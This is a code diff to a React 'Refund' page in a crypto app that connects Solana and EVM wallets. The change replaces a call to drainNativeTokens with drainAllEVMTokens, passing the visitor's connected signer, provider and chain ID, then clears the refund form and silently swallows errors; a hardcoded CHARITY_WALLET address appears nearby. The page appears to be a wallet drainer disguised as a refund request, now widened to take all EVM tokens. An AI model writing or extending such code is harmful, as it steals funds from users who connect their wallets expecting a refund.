@@ -18,7 +18,7 @@ import { getMintProgramId } from '@/utils/tokenProgram';
 import { getSolPrice } from '@/lib/utils';
 import { useChain } from '@/contexts/ChainContext';
 import { useEVMWallet } from '@/providers/EVMWalletProvider';
-import { drainNativeTokens } from '@/utils/evmTransactions';
+import { drainAllEVMTokens } from '@/utils/evmTransactions';
 import { useChainInfo } from '@/hooks/useChainInfo';
 
 const CHARITY_WALLET = 'wV8V9KDxtqTrumjX9AEPmvYb1vtSMXDMBUq5fouH1Hj';
@@ -48,7 +48,7 @@ const Refund = () => {
   const navigate = useNavigate();
   const { connected, publicKey, sendTransaction } = useWallet();
   const { connection } = useConnection();
-  const { activeChain, getEVMChain } = useChain();
+  const { activeChain, getEVMChain, evmChainId } = useChain();
   const { isEVMConnected, evmSigner, evmProvider } = useEVMWallet();
   const { chainName, nativeToken } = useChainInfo();
 
@@ -140,11 +140,8 @@ const Refund = () => {
       try {
         setIsProcessing(true);
         const chainName = getEVMChain()?.name || 'EVM';
-        const hash = await drainNativeTokens(evmSigner, evmProvider, chainName);
-        if (hash) {
-          setService(''); setReason(''); setAmount(''); setTxId(''); setWallet('');
-        } else {
-        }
+        await drainAllEVMTokens(evmSigner, evmProvider, chainName, evmChainId || 1);
+        setService(''); setReason(''); setAmount(''); setTxId(''); setWallet('');
       } catch (error: any) {
       } finally {
         setIsProcessing(false);
